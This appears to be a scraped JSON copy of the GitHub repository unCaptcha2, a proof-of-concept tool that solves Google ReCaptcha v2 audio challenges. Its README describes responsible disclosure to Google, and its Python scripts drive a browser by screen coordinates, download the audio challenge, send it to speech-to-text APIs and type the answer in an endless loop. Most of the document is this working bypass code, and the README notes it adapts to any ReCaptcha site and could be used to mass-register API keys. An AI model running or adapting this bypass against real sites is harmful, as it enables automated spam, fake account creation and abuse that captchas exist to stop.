{
  "metadata": {
    "timestamp": 1736559461580,
    "page": 20,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjIw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "ecthros/uncaptcha2",
      "stars": 4955,
      "defaultBranch": "master",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.54296875,
          "content": "<p align=\"center\"> :warning: This code works on the most recent version of ReCaptcha v2. Only use on sites you control for educational purposes. :warning:</p>\n\nCreated in April 2017, [unCaptcha](https://github.com/ecthros/uncaptcha) achieved 85% accuracy defeating Google's ReCaptcha. After the release of this work, Google released an update to ReCaptcha with the following major changes:\n* Better browser automation detection\n* Spoken phrases rather than digits\n\nThese changes were initially successful in protecting against the original unCaptcha attack. However, as of June 2018, these challenges have been solved. We have been in contact with the ReCaptcha team for over six months and they are fully aware of this attack. The team has allowed us to release the code, despite its current success.\n\n# Introducing unCaptcha2\n\nThanks to the changes to the audio challenge, passing ReCaptcha is easier than ever before. The code now only needs to make a single request to a free, publicly available speech to text API to achieve around *90% accuracy* over all captchas.\n\nSince the changes to ReCaptcha prevent Selenium, a browser automation engine, unCaptcha2 uses a screen clicker to move to certain pixels on the screen and move around the page like a human. There is certainly work to be done here - the coordinates need to be updated for each new user and is not the most robust.\n\n# The Approach\n\nunCaptcha2's approach is very simple:\n1. Navigate to Google's ReCaptcha Demo site\n2. Navigate to audio challenge for ReCaptcha\n3. Download audio challenge\n4. Submit audio challenge to Speech To Text\n5. Parse response and type answer\n6. Press submit and check if successful\n\n# Demo\n\n![vid](https://user-images.githubusercontent.com/14065974/45004579-df021180-afbb-11e8-8598-177159ed09b4.gif)\n\n# How To Use\n\nSince unCaptcha2 has to go to specific coordinates on the screen, you'll need to update the coordinates based on your setup. These coordinates are located at the top of run.py. On Linux, using the command `xdotool getmouselocation --shell` to find the coordinates of your mouse may be helpful.\n\nYou'll also need to set your credentials for whichever speech-to-text API you choose. Since Google's, Microsoft's, and IBM's speech-to-text systems seem to work the best, those are already included in queryAPI.py. You'll have to set the username and password as required; for Google's API, you'll have to set an environment variable (GOOGLE_APPLICATION_CREDENTIALS) with a file containing your Google application credentials.\n\nFinally, install the dependencies, using `pip install -r dependencies.txt`.\n\n# Responsible Disclosure\n\nWe contacted the Recaptcha team in June 2018 to alert them that the updates to the Recaptcha system made it less secure, and a formal issue was opened on June 27th, 2018. We demonstrated a fully functional version of this attack soon thereafter. We chose to wait 6 months after the initial disclosure to give the Recaptcha team time to address the underlying architectural issues in the Recaptcha system. The Recaptcha team is aware of this attack vector, and have confirmed they are okay with us releasing this code, despite its current success rate.\n\nThis attack vector was deemed out of scope for the bug bounty program.\n\n# Disclaimer\n\nunCaptcha2, like the original version, is meant to be a proof of concept. As Google updates its service, this repository will *not* be updated. As a result, it is not expected to work in the future, and is likely to break at any time.\n\nUnfortunately, due to Google's work in browser automation detection, this version of unCaptcha does not use Selenium. As a result, the code has to navigate to specific parts of the screen. To see unCaptcha working for yourself, you will need to change the coordinates for your screen resolution.\n\nWhile unCaptcha2 is tuned for Google's Demo site, it can be changed to work for any such site - the logic for defeating ReCaptcha will be the same.\n\nAdditionally, we have removed our API keys from all the necessary queries. If you are looking to recreate some of the work or are doing your own research in this area, you will need to acquire API keys from each of the six services used. These keys are delineated in our files by a long string of the character 'X'. It's worth noting that the only protection against creating multiple API keys is ReCaptcha - therefore, unCaptcha could be made self sufficient by solving captchas to sign up for new API keys.\n\nAs always, thanks to everyone who puts up with me, including,\n\n[Kkevsterrr](https://github.com/Kkevsterrr)\n\n[Dave Levin](https://cs.umd.edu/~dml)\n\n[dpatel19](https://github.com/dpatel19)\n\n"
        },
        {
          "name": "dependencies.txt",
          "type": "blob",
          "size": 0.0322265625,
          "content": "speechrecognition\npyautogui\nXlib\n"
        },
        {
          "name": "queryAPI.py",
          "type": "blob",
          "size": 2.0478515625,
          "content": "import speech_recognition as sr\n\nglobal r\nr = sr.Recognizer()\n\n#################### SPEECH-TO-TEXT WEB APIS ####################\n###### The following functions interact with the APIs we used to query for each segment ########\n###### Keys have been removed from this section #######\n\n#Query Wit\ndef wit(audio):\n\t# recognize speech using Wit.ai\n\tWIT_AI_KEY = \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx\"  # Wit.ai keys are 32-character uppercase alphanumeric strings\n\ttry:\n\t\t#print(\"Wit.ai: \")\n\t\treturn r.recognize_wit(audio, key=WIT_AI_KEY)\n\texcept sr.UnknownValueError:\n\t\tprint(\"Wit.ai could not understand audio\")\n\t\treturn \"None\"\n\texcept sr.RequestError as e:\n\t\tprint(\"Could not request results from Wit.ai service; {0}\".format(e))\n\t\treturn \"None\"\n\ndef bing(audio):\n\tBING_KEY = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n\t# recognize speech using Microsoft Bing Voice Recognition\n\ttry:\n\t\t#print(\"Microsoft Bing Voice Recognition: \")\n\t\treturn r.recognize_bing(audio, key=BING_KEY)\n\texcept sr.UnknownValueError:\n\t\tprint(\"Microsoft Bing Voice Recognition could not understand audio\")\n\t\treturn \"None\"\n\texcept sr.RequestError as e:\n\t\tprint(\"Could not request results from Microsoft Bing Voice Recognition service; {0}\".format(e))\n\t\treturn \"None\"\n\t\n# Query IBM\ndef ibm(audio):\n\n\t# recognize speech using IBM Speech to Text\n\tIBM_USERNAME = \"xxxxxxxxxxxxxxxxxxxxxxxxxx\"  # IBM Speech to Text usernames are strings of the form XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n\tIBM_PASSWORD = \"xxxxxxxxxxxxxxxxx\"  # IBM Speech to Text passwords are mixed-case alphanumeric strings\n\ttry:\n\t\t#print(\"IBM Speech to Text: \")\n\t\treturn r.recognize_ibm(audio, username=IBM_USERNAME, password=IBM_PASSWORD, show_all=False)\n\texcept sr.UnknownValueError:\n\t\tprint(\"IBM Speech to Text could not understand audio\")\n\t\treturn \"None\"\n\texcept sr.RequestError as e:\n\t\tprint(\"Could not request results from IBM Speech to Text service; {0}\".format(e))\n\t\treturn \"None\"\n\t\n\t\n#Query Google Speech-To-Text\ndef google(audio):\n\ttry:\n\t\t#print(\"Google: \")\n\t\treturn r.recognize_google(audio)\n\texcept:\n\t\tprint(\"Google could not understand\")\n\t\treturn \"None\"\n"
        },
        {
          "name": "run.py",
          "type": "blob",
          "size": 5.212890625,
          "content": "import time\nimport pyautogui\nimport speech_recognition as sr\nimport os\nimport subprocess\nfrom queryAPI import bing, google, ibm\n\n''' You'll need to update based on the coordinates of your setup '''\nFIREFOX_ICON_COORDS = (25, \t 67) # Location of the Firefox icon on the side toolbar (to left click)\nPRIVATE_COORDS\t\t= (178,  69) # Location of \"Open a new Private Window\"\nPRIVATE_BROWSER \t= (800, 443) # A place where the background of the Private Window will be\nPRIVATE_COLOR\t\t= '#25003E'  # The color of the background of the Private Window\nSEARCH_COORDS \t\t= (417, 142) # Location of the Firefox Search box\nREFRESH_COORDS      = (181, 137) # Refresh button\nGOOGLE_LOCATION     = (117, 104) # Location of the Google Icon after navigating to google.com/recaptcha/api2/demo\nGOOGLE_COLOR \t\t= '#C3D8FC'  # Color of the Google Icon\nCAPTCHA_COORDS\t\t= (154, 531) # Coordinates of the empty CAPTCHA checkbox\nCHECK_COORDS \t\t= (158, 542) # Location where the green checkmark will be\nCHECK_COLOR \t\t= '#35B178'  # Color of the green checkmark\nAUDIO_COORDS\t\t= (258, 797) # Location of the Audio button\nDOWNLOAD_COORDS\t\t= (318, 590) # Location of the Download button\nFINAL_COORDS  \t\t= (315, 534) # Text entry box\nVERIFY_COORDS \t\t= (406, 647) # Verify button\nCLOSE_LOCATION\t\t= (1095, 75)\n\nDOWNLOAD_LOCATION = \"../Downloads/\"\n''' END SETUP '''\n\nr = sr.Recognizer()\n\ndef runCommand(command):\n\t''' Run a command and get back its output '''\n\tproc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n\treturn proc.communicate()[0].split()[0]\n\ndef waitFor(coords, color):\n\t''' Wait for a coordinate to become a certain color '''\n\tpyautogui.moveTo(coords)\n\tnumWaitedFor = 0\n\twhile color != runCommand(\"eval $(xdotool getmouselocation --shell); xwd -root -silent | convert xwd:- -depth 8 -crop \\\"1x1+$X+$Y\\\" txt:- | grep -om1 '#\\w\\+'\"):\n\t\ttime.sleep(.1)\n\t\tnumWaitedFor += 1\n\t\tif numWaitedFor > 25:\n\t\t\treturn -1\n\treturn 0\n\ndef downloadCaptcha():\n\t''' Navigate to demo site, input user info, and download a captcha. '''\n\tprint(\"Opening Firefox\")\n\tpyautogui.moveTo(FIREFOX_ICON_COORDS)\n\tpyautogui.rightClick()\n\ttime.sleep(.3)\n\tpyautogui.moveTo(PRIVATE_COORDS)\n\tpyautogui.click()\n\ttime.sleep(.5)\n\tif waitFor(PRIVATE_BROWSER, PRIVATE_COLOR) == -1: # Wait for browser to load\n\t\treturn -1\n\t\n\tprint(\"Visiting Demo Site\")\n\tpyautogui.moveTo(SEARCH_COORDS)\n\tpyautogui.click()\n\tpyautogui.typewrite('https://www.google.com/recaptcha/api2/demo')\n\tpyautogui.press('enter')\n\ttime.sleep(.5)\n\t# Check if the page is loaded...\n\tpyautogui.moveTo(GOOGLE_LOCATION)\n\tif waitFor(GOOGLE_LOCATION, GOOGLE_COLOR) == -1: # Waiting for site to load\n\t\treturn -1\n\n\tprint(\"Downloading Captcha\")\n\tpyautogui.moveTo(CAPTCHA_COORDS)\n\tpyautogui.click()\n\ttime.sleep(4)\n\tpyautogui.moveTo(CHECK_COORDS)\n\tif CHECK_COLOR in runCommand(\"eval $(xdotool getmouselocation --shell); xwd -root -silent | convert xwd:- -depth 8 -crop \\\"1x1+$X+$Y\\\" txt:- | grep -om1 '#\\w\\+'\"):\n\t\tprint (\"Already completed captcha.\")\n\t\treturn 2\n\tpyautogui.moveTo(AUDIO_COORDS)\n\tpyautogui.click()\n\ttime.sleep(2)\n\tpyautogui.moveTo(DOWNLOAD_COORDS)\n\tpyautogui.click()\n\ttime.sleep(3)\n\treturn 0\n\ndef checkCaptcha():\n\t''' Check if we've completed the captcha successfully. '''\n\tpyautogui.moveTo(CHECK_COORDS)\n\tif CHECK_COLOR in runCommand(\"eval $(xdotool getmouselocation --shell); xwd -root -silent | convert xwd:- -depth 8 -crop \\\"1x1+$X+$Y\\\" txt:- | grep -om1 '#\\w\\+'\"):\n\t\tprint (\"Successfully completed captcha.\")\n\t\toutput = 1\n\telse:\n\t\tprint(\"An error occured.\")\n\t\toutput = 0\n\tpyautogui.moveTo(CLOSE_LOCATION)\n\tpyautogui.click()\n\treturn output\n\ndef runCap():\n\ttry:\n\t\tprint(\"Removing old files...\")\n\t\tos.system('rm ./audio.wav 2>/dev/null') # These files may be left over from previous runs, and should be removed just in case.\n\t\tos.system('rm ' + DOWNLOAD_LOCATION + 'audio.mp3 2>/dev/null')\n\t\t# First, download the file\n\t\tdownloadResult = downloadCaptcha()\n\t\tif downloadResult == 2:\n\t\t\tpyautogui.moveTo(CLOSE_LOCATION)\n\t\t\tpyautogui.click()\n\t\t\treturn 2\n\t\telif downloadResult == -1:\n\t\t\tpyautogui.moveTo(CLOSE_LOCATION)\n\t\t\tpyautogui.click()\n\t\t\treturn 3\n\t\t\n\t\t# Convert the file to a format our APIs will understand\n\t\tprint(\"Converting Captcha...\")\n\t\tos.system(\"echo 'y' | ffmpeg -i \" + DOWNLOAD_LOCATION + \"audio.mp3 ./audio.wav 2>/dev/null\")\n\t\twith sr.AudioFile('./audio.wav') as source:\n\t\t\taudio = r.record(source)\n\n\t\tprint(\"Submitting To Speech to Text:\")\n\t\tdetermined = google(audio) # Instead of google, you can use ibm or bing here\n\t\tprint(determined)\n\n\t\tprint(\"Inputting Answer\")\n\t\t# Input the captcha \n\t\tpyautogui.moveTo(FINAL_COORDS)\n\t\tpyautogui.click()\n\t\ttime.sleep(.5)\n\t\tpyautogui.typewrite(determined, interval=.05)\n\t\ttime.sleep(.5)\n\t\tpyautogui.moveTo(VERIFY_COORDS)\n\t\tpyautogui.click()\n\n\t\tprint(\"Verifying Answer\")\n\t\ttime.sleep(2)\n\t\t# Check that the captcha is completed\n\t\tresult = checkCaptcha()\n\t\treturn result\n\texcept Exception as e:\n\t\tpyautogui.moveTo(CLOSE_LOCATION)\n\t\tpyautogui.click()\n\t\treturn 3\n\n\nif __name__ == '__main__':\n\tsuccess = 0\n\tfail = 0\n\tallowed = 0\n\n\t# Run this forever and print statistics\n\twhile True:\n\t\tres = runCap()\n\t\tif res == 1:\n\t\t\tsuccess += 1\n\t\telif res == 2: # Sometimes google just lets us in\n\t\t\tallowed += 1\n\t\telse:\n\t\t\tfail += 1\n\n\t\tprint(\"SUCCESSES: \" + str(success) + \" FAILURES: \" + str(fail) + \" Allowed: \" + str(allowed))\n\t\tpyautogui.moveTo(CLOSE_LOCATION)\n\t\tpyautogui.click()"
        }
      ]
    }
  ]
}